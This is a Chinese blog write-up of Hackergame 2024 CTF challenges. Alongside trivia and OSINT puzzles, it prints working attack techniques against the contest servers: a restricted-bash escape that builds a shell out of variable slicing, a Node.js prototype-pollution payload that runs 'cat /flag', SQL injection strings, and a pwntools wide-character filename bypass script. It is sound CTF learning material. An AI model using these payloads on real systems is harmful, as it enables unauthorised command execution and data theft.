---
title: Hackergame 2024 题解（一）
disableNunjucks: false
mathjax: false
id: 12160
date: 2024-11-09 13:10:22
categories: 
  - CTF题解
tags:
  - Hackergame
  - Hackergame 2024
cover: https://blogfiles.oss.fyz666.xyz/webp/0e71694e-9772-4998-aecb-3bb41267a079.webp
---

本文是Hackergame 2024 题解的第一部分。

## 签到

{% hideToggle 查看题面 %}

{% note primary %}

让我们说……各种语言，开始今年的冒险！

<audio controls='' src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E7%AD%BE%E5%88%B0/files/Hackergame.mp3"></audio>

```raw
Hackergame～🚩🎶哦Hackergame～🚩🎶哦Hackergame🚩🎶
有了你😙❤️🚩，生活美好😍🙏💐，没烦恼🤷🤤🎼
Hackergame传奇🌊🚩🧜‍♂️，奇妙至极✨🧞‍♂️
最棒比赛🤩👾🎮，人人赞叹你👍👍👍
如果卡关😖😭，那可不对🙅⭕️😝
今晚没拿flag🚩😨❓，我就会吼叫😱😱🙉
无论白天☀️🤤🚩，还是黑夜🌙😪💤
Hackergame的挑战让头脑清醒🤯🤯
```

{% endnote %}

{% endhideToggle %}

直接提交，把参数`?pass=false`改成`?pass=true`重新访问即可。

~~这歌真洗脑，每天听几遍~~

## 喜欢做签到的 CTFer 你们好呀

{% hideToggle 查看题面 %}

{% note primary %}

喜欢做签到的 CTFer 你们好呀，我是一道更**典型**的 checkin：有两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里！

{% endnote %}

{% endhideToggle %}

众所周知，中国科学技术大学校内CTF战队是Nebula，招新主页位于https://www.nebuu.la/

打开发现是个网页模拟的终端，找了半天发现`ls -a`可以找到第二个flag，`env`可以找到第一个flag。(第一个flag找了半天，因为一开始完全没想到去看环境变量)

## 猫咪问答（Hackergame 十周年纪念版）

{% hideToggle 查看题面 %}

{% note primary %}

1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？**（30 分）**

   提示：填写教室编号，如 5207、3A101。

2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？**（30 分）**

   提示：是一个非负整数。

3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？**（20 分）**

   提示：仅由中文汉字构成。

4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？**（10 分）**

   提示：是一个非负整数。

5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？**（5 分）**

   提示：id 前 6 位，字母小写，如 c1e939。

6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？**（5 分）**

   提示：首次打开本页时的 HTML 源代码，答案是一个非负整数

{% endnote %}

{% endhideToggle %}

1. 这题找了半天，因为那一年的Hackergame好像没写新闻稿，甚至似乎还不叫Hackergame，叫什么「信息安全大赛」，最后在[这个页面](https://lug.ustc.edu.cn/wiki/sec/contest.html)翻到了结果，答案为3A204

2. 翻官方GitHub存档发现是2019年（注意只需要看2019-2023年这5年的题），然后搜到[网页](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)，答案为2682

3. 搜图书馆官网没有搜到相关信息（图书馆怎么可能去记录这种东西），然后想到去GitHub上的2018年题解存档的[花絮页](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)看看，发现了答案：程序员的自我修养

4. 搜到[相关论文](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)，~~把里面出现到的数字都试了一遍~~，然后找到答案：336

5. 前段时间正好关注了这个事件，当时就找到了[相关的commit](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)，于是这题不废催飞滋力

6. 找到了这个模型的hf页面，结果：<img src="https://blogfiles.oss.fyz666.xyz/png/ddee409c-fbd4-4312-881a-fc5c55988feb.png" alt="image-20241109134621799" style="zoom:50%;" />

   蚌！后来找了一个[在线运行分词器的网页](https://huggingface.co/spaces/Xenova/the-tokenizer-playground)。复制进去得到1834，提交发现不对，遂去穷举，得到答案1833。原来是之前复制进去最开始多了换行。

## 打不开的盒

{% hideToggle 查看题面 %}

{% note primary %}

如果一块砖头里塞进了一张写了 flag 的纸条，应该怎么办呢？相信这不是一件困难的事情。

现在，你遇到了同样的情况：这里有一个密封盒子的设计文件，透过镂空的表面你看到里面有些东西……

<img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/files/flagbox.jpg" style="zoom:50%;">

[本题附件](https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%89%93%E4%B8%8D%E5%BC%80%E7%9A%84%E7%9B%92/files/flagbox.stl)

{% endnote %}

{% endhideToggle %}

找到一个在线查看这种文件的[网页](https://www.viewstl.com/classic/)。

然后逐个尝试右边的选项，最后发现把`Display`下面的`Wireframe`选上，即可发现flag：

<img src="https://blogfiles.oss.fyz666.xyz/png/3d6070a6-2676-43fc-8549-cc91cb9e4b36.png" alt="image-20241109135258547" style="zoom:50%;" />

放大以后可以直接肉眼看出。

另：如果奖品能附带发个这个盒子的透明版，那一定是极好的。

## 每日论文太多了！

{% hideToggle 查看题面 %}

{% note primary %}

传闻，每日新发表的论文

有七成都会在一年内被遗忘

而且五年后

基本都无人问津

它们被学术界的快节奏淹没

有人引用

有人忽视

我不期盼这学术世界，以及我的研究

能在这汪洋般的文献中脱颖而出

然而，我有时会思考

如果我的论文能被更多人阅读

如果我的研究能对他人有所启发

如果我能为这个领域贡献一点价值

届时

我将作何感想

<p align="right">——改编自「負けヒロインが多すぎる！」Ep 1，存在 AI 创作</p>


要怎么做才能读读 [我们的论文](https://dl.acm.org/doi/10.1145/3650212.3652145)？只要是我能做的，我什么都愿意做！

{% endnote %}

{% endhideToggle %}

给了一个[ACM论文的链接](https://dl.acm.org/doi/10.1145/3650212.3652145)，然后没有其他任何附件了？

我百思不解，总不可能在ACM官网上做文章吧。于是我打开论文，去了解了一下这个论文的算法，找到了他给的源码GitHub链接。我甚至把这个项目跑了起来，但始终想不通这和拿flag有什么关系。

---

后来这个题解出的人越来越多，我意识到自己的方向出了问题。我打开论文直接搜索flag，居然搜到了一处高亮：

<img src="https://blogfiles.oss.fyz666.xyz/png/9b83fc7a-3041-40ed-a93d-c665cbd8c378.png" alt="image-20241109135919432" style="zoom:50%;" />

然而看上去又什么都没有，复制一下这里的内容，发现是“flag here”，难道flag藏在图里？

于是我把这篇论文的pdf的图片全部导出，然后发现：

<img src="https://blogfiles.oss.fyz666.xyz/png/681c0ca5-fdac-4654-911c-031ef293624a.png" alt="image-20241109140111767" style="zoom:50%;" />

草，这是什么行为艺术？

## 比大小王

{% hideToggle 查看题面 %}

{% note primary %}

「小孩哥，你干了什么？竟然能一边原崩绝鸣舟，一边农瓦 CSGO。你不去做作业，我等如何排位上分？」

小孩哥不禁莞尔，淡然道：「很简单，做完口算题，拿下比大小王，家长不就让我玩游戏了？」

说罢，小孩哥的气息终于不再掩饰，一百道题，十秒速通。

在这场巅峰对决中，你能否逆风翻盘狙击小孩哥，捍卫我方尊严，成为新一代的「比大小王」？！

{% endnote %}

{% endhideToggle %}

这题估计灵感来源于前段时间很火的[大学生入侵小猿搜题事件](https://app.xinhuanet.com/news/article.html?articleId=d8b06038c4cf4dd3e32c5fc653f3419c)

咦，这不是写脚本就行了？一开始我写了个JS脚本，试图在浏览器里直接给他过了，结果发现题目的刷新似乎存在延迟，我无论如何都没法在10秒内跑完全部题目。遂分析了一下接口，然后写了个Python脚本：

```python
import json
import time
import requests

sess = requests.session()

headers = {
    'content-type': 'application/json',
    'cookie': 'Your cookie here'
}
game = sess.post('http://202.38.93.141:12122/game', data=json.dumps({}), headers=headers).json()['values']

data = {'inputs': []}
for a, b in game:
    if a < b:
        data['inputs'].append('<')
    else:
        data['inputs'].append('>')

time.sleep(5)
headers['cookie'] = f'session={sess.cookies["session"]}'
r = sess.post('http://202.38.93.141:12122/submit', data=json.dumps(data), headers=headers)
print(r.json())

```

稍微处理了一下`Cookie`就过了。

## 旅行照片 4.0

{% hideToggle 查看题面 %}

{% note primary %}

「又要重复吗，绝望的轮回」

你的学长今年还在旅游…… 对，对吗？你似乎注意到了什么。

{% endnote %}

{% endhideToggle %}

{% hideToggle ...LEO 酱？……什么时候 %}

「说起来最近学长的 ** 空间里怎么没有旅游的照片了……」

正当你在这样想的时候，突然刷到学长的一条吐槽：

>> 你们的生活到底真的假的呀？每天要么就是看漫展看偶像看 live 喝酒吃烧烤，要么就是这里那里旅游。阵容一宣，说冲就冲，群一拉，机票一买，钱就像大风刮来的，时间好像一直有。c\*\*4 你们也去，mu\*\*ca 你们也去，m\*\*o 你们也去，to\*ea\*i 你们也去。我怎么一天到晚都在上班啊，你们那到底是怎么弄的呀？教教我行不行
> 
> <img src="https://raw.githubusercontent.com/USTC-Hackergame/hackergame2024-writeups/refs/heads/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/klkq.jpg" style="zoom: 50%;">

~~出去玩的最多的难道不就是您自己吗？~~

看样子学长是受到了什么刺激…… 会是什么呢？话说照片里这是…… Leo 酱？……什么时候
{% endhideToggle %}

**问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：**`X校区Y门`**，均为一个汉字）**

科大学生直接秒答。东校区西门

**问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：**`YYYYMMDD`**）**

搜到[网页](https://www.bilibili.com/opus/930934582351495204)，得到答案为20240519。

---

{% hideToggle 诶？我带 LEO 酱出去玩？真的假的？%}
「拍照的时候带着 LEO 酱看起来是个不错的选择」，回忆完上次的 ACG 音乐会，你这样想到，不过说到底要去哪里呢？

这样想着，你打开自己的相册翻找，「我记得之前保存了几个还不错的地方……」

<img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image01.jpg" style="zoom: 50%;">

<img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image04.jpg" style="zoom: 50%;">

嗯？奇怪的记忆增加了。诶，我到过这些地方吗？

{% endhideToggle %}

**问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）**

这题直接搜图似乎是真搜不到什么东西，不过我一下就注意到了垃圾桶上的“六安园林”四个字，一开始以为这就是公园名（忘了placeholder上的内容）。

然后我注意到路上有一条彩虹线条，遂搜索：六安 彩虹跑道。搜到[网页](https://www.sohu.com/a/498872898_100023473)，对比了一下三种颜色的排列，发现应该是对的，得到答案为：中央公园。

**问题 4: 这个景观所在的景点的名字是？（三个汉字）**

直接搜图即可，搜到三峡截流石，再顺着这个线索一通搜索三个字的景区，搜到：坛子岭。

---

{% hideToggle 尤其是你才是最该多练习的人 %}

调查自己还是头一回，多新鲜啊。不过，还没来得及理清头绪，你突然收到了来自学长的信息：

> <img src="https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/master/official/%E6%97%85%E8%A1%8C%E7%85%A7%E7%89%87%204.0/photos/image06.jpg" style="zoom: 50%;">
> 来练练手，看看能挖出什么有趣的东西。

糟了，三番五次调查学长被他发现了？不过，这个照片里的车型是……

{% endhideToggle %}

**问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）**

没看题目提示，直接注意到左下角的那个车的车身带粉色刷漆，搜索“动车 粉色”，直接搜到[网页](https://www.sohu.com/a/823020940_121117452)，于是先出下一问答案：CRH6F-A

然后搜了一下这班列车的经停站：

<img src="https://blogfiles.oss.fyz666.xyz/png/8c18546e-bb3c-44a5-8e33-2d6edd77558c.png" alt="image-20241109142626373" style="zoom:50%;" />

好像也不多？手动一个一个试过来，发现清河站附近的一个医院：积水潭医院，符合要求。

**问题 6: 左下角的动车组型号是？**

如上：CRH6F-A

---

## 不宽的宽字符

{% hideToggle 查看题面 %}

{% note primary %}

A 同学决定让他设计的 Windows 程序更加「国际化」一些，首先要做的就是读写各种语言写下的文件名。于是他放弃 C 语言中的 char，转而使用宽字符 wchar_t，显然这是一个国际化的好主意。

经过一番思考，他写出了下面这样的代码，用来读入文件名：

```cpp
// Read the filename
std::wstring filename;
std::getline(std::wcin, filename);
```
转换后要怎么打开文件呢？小 A 使用了 C++ 最常见的写法：

```cpp
// Create the file object and open the file specified
std::wifstream f(filename);
```

可惜的是，某些版本的 C++ 编译器以及其自带的头文件中，文件名是 char 类型的，因此这并不正确。这时候小 A 灵光一闪，欸🤓👆，我为什么不做一个转换呢？于是：

```cpp
std::wifstream f((char*)filename);
```

随便找了一个文件名测试过无误后，小 A 对自己的方案非常自信，大胆的在各个地方复用这段代码。然而，代价是什么呢？

---

现在你拿到了小 A 程序的一部分，小 A 通过在文件名后面加上一些内容，让你不能读取藏有 flag 的文件。

你需要的就是使用某种输入，读取到文件 `theflag` 的内容（完整位置是：`Z:\theflag`）。

> 注：为了使得它能在一些系统上正确地运行，我们使用 Docker 作了一些封装，并且使用 WinAPI 来保证行为一致，不过这并不是题目的重点。

[本题附件](https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E4%B8%8D%E5%AE%BD%E7%9A%84%E5%AE%BD%E5%AD%97%E7%AC%A6/files/what_if_wider.zip)

{% endnote %}

{% endhideToggle %}

题目源码如下：

```cpp
#include <iostream>
#include <fstream>
#include <cctype>
#include <string>
#include <windows.h>

int main()
{
    std::wcout << L"Enter filename. I'll append 'you_cant_get_the_flag' to it:" << std::endl;

    // Get the console input and output handles
    HANDLE hConsoleInput = GetStdHandle(STD_INPUT_HANDLE);
    HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);

    if (hConsoleInput == INVALID_HANDLE_VALUE || hConsoleOutput == INVALID_HANDLE_VALUE)
    {
        // Handle error – we can't get input/output handles.
        return 1;
    }

    DWORD mode;
    GetConsoleMode(hConsoleInput, &mode);
    SetConsoleMode(hConsoleInput, mode | ENABLE_PROCESSED_INPUT);

    // Buffer to store the wide character input
    char inputBuffer[256] = { 0 };
    DWORD charsRead = 0;

    // Read the console input (wide characters)
    if (!ReadFile(hConsoleInput, inputBuffer, sizeof(inputBuffer), &charsRead, nullptr))
    {
        // Handle read error
        return 2;
    }

    // Remove the newline character at the end of the input
    if (charsRead > 0 && inputBuffer[charsRead - 1] == L'\n')
    {
        inputBuffer[charsRead - 1] = L'\0'; // Null-terminate the string
        charsRead--;
    }

    // Convert to WIDE chars
    wchar_t buf[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));

    std::wstring filename = buf;

    // Haha!
    filename += L"you_cant_get_the_flag";

    std::wifstream file;
    file.open((char*)filename.c_str());

    if (file.is_open() == false)
    {
        std::wcout << L"Failed to open the file!" << std::endl;
        return 3;
    }

    std::wstring flag;
    std::getline(file, flag);

    std::wcout << L"The flag is: " << flag << L". Congratulations!" << std::endl;

    return 0;
}
```

不是很看得懂一些函数是在干什么，但通过拷问GPT，以及查找各种文档，发现其实所谓的“宽字符”就是把相邻两个普通字符的ascii码分为低位和高位拼在一起，作为一整个字符处理。而反过来把宽字符转为普通字符的时候则是做相反操作，并且C语言的`char*`是检测到`\x0`就直接截断了。

那么小A在后面拼的这一串`you_cant_get_the_flag`起到了什么作用呢？我反正没看出来。

于是写出脚本：

```python
from pwn import remote

ascii_bytes = [
    0x5A,  # 'Z'
    0x3A,  # ':'
    0x2f,  # '/'
    0x2f,  # '/'
    0x74,  # 't'
    0x68,  # 'h'
    0x65,  # 'e'
    0x66,  # 'f'
    0x6C,  # 'l'
    0x61,  # 'a'
    0x67   # 'g'
]

wchar_values = []
for i in range(0, len(ascii_bytes), 2):
    low_byte = ascii_bytes[i]
    high_byte = ascii_bytes[i+1] if i+1 < len(ascii_bytes) else 0x00
    wchar = (high_byte << 8) + low_byte
    wchar_values.append(wchar)

payload = ''.join(chr(wchar) for wchar in wchar_values).encode()
r = remote('202.38.93.141', 14202)
r.sendlineafter(b'token: \n', b'TOKEN')
r.sendlineafter(b"I'll append 'you_cant_get_the_flag' to it:\r\n", payload)
print(r.recv())

```

一开始试了`Z:\theflag`，然而没过，然后把反斜杠换成了两个正斜杠就过了。

所以这题小A到底试了什么文件名可以「测试过无误」的？

---

## PowerfulShell

{% hideToggle 查看题面 %}

{% note primary %}

即使贝壳早已破碎，也请你成为 PowerfulShell 之王。

<details>
<summary>题目核心逻辑预览（点击展开）</summary>
```bash
#!/bin/bash

FORBIDDEN_CHARS="'\";,.%^*?!@#%^&()><\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0"

PowerfulShell() {
    while true; do
        echo -n 'PowerfulShell@hackergame> '
        if ! read input; then
            echo "EOF detected, exiting..."
            break
        fi
        if [[ $input =~ [$FORBIDDEN_CHARS] ]]; then
            echo "Not Powerful Enough :)"
            exit
        else
            eval $input
        fi
    done
}

PowerfulShell
```

</details>

flag 位于根目录 / 下。


{% endnote %}

{% endhideToggle %}

很有意思的题，但我平时写`bash`写少了，对它的很多特性不太了解，因此卡到了第四天才解出这题。

在看源码之前我一直以为这是个`Powershell`题，比起`bash`，`Powershell`我就更不会了，因此我前两天根本没看这题。

然后我发现是个`bash`，那似乎还能做一下。

发现这题就是把很多字符都ban了，需要我们用仅剩的几个字符去运行起来`cat /flag`。

我一开始搜“execute bash without letters”，搜到了[这个网页](https://www.reddit.com/r/hacking/comments/1bdjg9z/linux_shell_escape_execute_commands_without/)。

发现楼主似乎在骗picoCTF的思路，笑死。

<img src="https://blogfiles.oss.fyz666.xyz/png/7d2a6405-7aad-4e76-9473-5ac2f8f69fbe.png" alt="image-20241109144024043" style="zoom:50%;" />

楼主表示可以用下面这个字符串代替命令`ls`

```bash
$'\154'$'\163'
```

不过我们的题目ban了单引号，所以这个方法走不通。

然后我查了一下这个picoCTF的题，发现和我们这个题还是有点区别，限制的字符少了许多。

最后我开始翻`bash`特殊指令的文档（话说不应该一开始就这么做吗），发现`bash`可以用美元符号、花括号、冒号实现字符串切片，格式大概是这样：

```bash
${s:start:length}
```



而很巧的是，这些符号都没被ban，然后我试了一下没被ban的另一个很有用的符号：`~`，发现它的输出是：`/players`

<img src="https://blogfiles.oss.fyz666.xyz/png/bd23934b-52e8-4d6b-a1c5-dbcab16345e8.png" alt="image-20241109144753976" style="zoom:50%;" />

那就有思路了！由于下划线可以随便用，我们相当于拥有了定义变量的能力，于是可以先把`~`的输出结果存到双下划线变量里：

```bash
__=~
```

然后`__`这个变量就等于了`/players`，通过对这个变量的切片，我们可以得到命令`ls`：

```bash
${__:2:1}${__:7:1}
```

执行一下命令发现当前路径下有且只有一个文件：

<img src="https://blogfiles.oss.fyz666.xyz/png/7e160bc9-2037-4a9e-9f2c-f779de1c9738.png" alt="image-20241109144825612" style="zoom:50%;" />

注意到这个输出有一个英文句号，我一开始还想着用`ls`去看看上级目录有啥，但转念一想，直接取最后两个字符，这不就直接拿到shell了，还费别的啥劲？于是：

```bash
__=`${__:2:1}${__:7:1}`
${__:14:2}
```

这样就绕过了字符限制，直接`cat /flag`即可：

<img src="https://blogfiles.oss.fyz666.xyz/png/0b0baee3-7626-4ed6-85fb-4056bc90e8b7.png" alt="image-20241109145214629" style="zoom:50%;" />

## Node.js is Web Scale

{% hideToggle 查看题面 %}

{% note primary %}

小 Q 最近在写 Node.js，需要一个键值数据库来存储数据。

~~众所周知~~，其他的数据库无论如何都需要 write to disk，所以它们 don't scale。直接写到 `/dev/null` 嘛，虽然性能很好，但是好像就拿不到写入的数据了。基于这个想法，小 Q 利用最新最热的~~还没跑路的~~大语言模型，生成了一段内存数据库的 Node.js 代码，绝对 web scale！

<details>
<summary>服务端代码（点击展开）</summary>
```js
// server.js
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { execSync } = require("child_process");

const app = express();
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

let cmds = {
  getsource: "cat server.js",
  test: "echo 'hello, world!'",
};

let store = {};

// GET /api/store - Retrieve the current KV store
app.get("/api/store", (req, res) => {
  res.json(store);
});

// POST /set - Set a key-value pair in the store
app.post("/set", (req, res) => {
  const { key, value } = req.body;

  const keys = key.split(".");
  let current = store;

  for (let i = 0; i < keys.length - 1; i++) {
    const key = keys[i];
    if (!current[key]) {
      current[key] = {};
    }
    current = current[key];
  }

  // Set the value at the last key
  current[keys[keys.length - 1]] = value;

  res.json({ message: "OK" });
});

// GET /get - Get a key-value pair in the store
app.get("/get", (req, res) => {
  const key = req.query.key;
  const keys = key.split(".");

  let current = store;
  for (let i = 0; i < keys.length; i++) {
    const key = keys[i];
    if (current[key] === undefined) {
      res.json({ message: "Not exists." });
      return;
    }
    current = current[key];
  }

  res.json({ message: current });
});

// GET /execute - Run commands which are constant and obviously safe.
app.get("/execute", (req, res) => {
  const key = req.query.cmd;
  const cmd = cmds[key];
  res.setHeader("content-type", "text/plain");
  res.send(execSync(cmd).toString());
});

app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start the server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`KV Service is running on port ${PORT}`);
});
```
</details>

注：

- 如果你在好奇标题是什么意思，可以搜索一个标题叫 "Mongo DB Is Web Scale" 的视频（虽然与本题解法无关）。

- flag 在 `/flag` 文件中。

{% endnote %}

{% endhideToggle %}

阅读服务端代码，发现`cmds`里有一些命令，但显然没有`cat /flag`，而我们又只能通过`execute`接口去执行命令，那要怎么办呢？

注意到我们可以用`set`接口为`current`这个变量设定键值对，而`JavaScript`当中，通过点运算可以获取到的attribute，也可以通过中括号运算获取，赋值也是同理，这样想法就很自然了，这是一个ProtoType污染攻击。

我们直接set：

```json
{
    "key": "__proto__.catflag",
    "value": "cat /flag"
}
```

然后`execute?cmd=catflag`，即可获取flag。

## PaoluGPT

{% hideToggle 查看题面 %}

{% note primary %}

在大语言模型时代，几乎每个人都在和大语言模型聊天。小 Q 也想找一个方便使用的 GPT 服务，所以在熟人推荐下，他注册了某个 GPT 服务，并且付了几块钱。只是出乎小 Q 意料的是，他才用了几天，服务商就跑路了！跑路的同时，服务商还公开了一些用户的聊天记录。小 Q 看着这些聊天记录，突然发现里面好像有 flag……

[本题附件](https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/PaoluGPT/files/paolugpt.zip)

**免责声明：本题数据来源自 [COIG-CQIA 数据集](https://modelscope.cn/datasets/m-a-p/COIG-CQIA/)。本题显示的所有该数据集中的数据均不代表 Hackergame 组委会的观点、意见与建议。**

{% endnote %}

{% endhideToggle %}


### 千里挑一

打开网页，发现有一堆聊天记录（999个），~~直接一个一个手动点开~~ 写个爬虫很快就找到了第一个flag。

### 窥视未知

那么第二个flag会在哪里呢？根据小题名“窥视未知”，感觉这个没找到的flag像是藏在什么未知的地方（什么废话文学）

我看了好久题目，发现居然这题还有个附件可以下载。。。火速下载下来，发现一个函数：

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

这里的SQL语句居然是直接字符串拼接来的，那么自然可以SQL注入，然后注意到：

```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)
```

看来还有`shown = false`的对话，于是我们只要构造`conversation_id`：

```raw
1' OR shown = false--
```

即可找到flag2。

那么用同样的方法也可以找到flag1：

```raw
1' OR contents LIKE '%flag%'--
```

## 强大的正则表达式

{% hideToggle 查看题面 %}

{% note primary %}

从小 Q 开始写代码以来，他在无数的项目、帖子中看到各种神秘的字符串，听人推荐过，这就是传说中万能的正则表达式。本着能摆烂就绝不努力的原则，小 Q 从来没想过了解这门高雅艺术，遇到不懂的正则表达式就通通丢给 LLM 嘛，他这样想到。不过夜深人静的时候，小 Q 也时常在纠结写这么多 `switch-case` 到底是为了什么。

终于在一个不眠夜，小 Q 一口气看完了正则表达式的教程。哈？原来这么简单？小 Q 并两分钟写完了自测题目，看着教程剩下的目录，「分组」、「贪婪」、「前瞻」，正则表达式也不过如此嘛，他心想，也就做一些邮箱匹配之类的简单任务罢了。

正当他还沉浸在「不过如此」的幻想中，他刷到了那个关于正则表达式的古老而又神秘的传说：

「正则表达式可以用来计算取模和 CRC 校验……」

[题目源代码](https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E5%BC%BA%E5%A4%A7%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/files/powerful_re.py)

{% endnote %}

{% endhideToggle %}

要写三个正则表达式完成三种不同的计算，限制字符为`0123456789()|*`

### Easy

计算10进制下对16的取模，要求取模为0时匹配成功。

这就是个送分题，我们知道10进制下一个数是否为16的倍数可以根据其最后四位数字来判断。

于是只要遍历一下最后四位数字，再把前面的一拼就行了：

```python
s = '(0|1|2|3|4|5|6|7|8|9)*('
for i in range(10000 // 16):
    s += f'{i * 16:04}|'
s = s[:-1] + ')'
```

### Medium

计算2进制下对13的取模，要求取模为0时匹配成功。

这我就不会了，虽然知道是要去构造有限状态自动机，但其实我一直都不会这个玩意，也有点懒得学（赛后一定补上）

不过好在我找到一个老哥GitHub上写的一个函数：[Regular Expression for Binary Numbers Divisible by n](https://github.com/NIaa/codewars/tree/master/Solutions/1_kyu/Regular%20Expression%20for%20Binary%20Numbers%20Divisible%20by%20n)

这不是完美契合这个题？于是运行了一下，把`+`换成了`*`，嫖到flag。

### Hard

搜不到一点，赛后一定恶补有限状态自动机。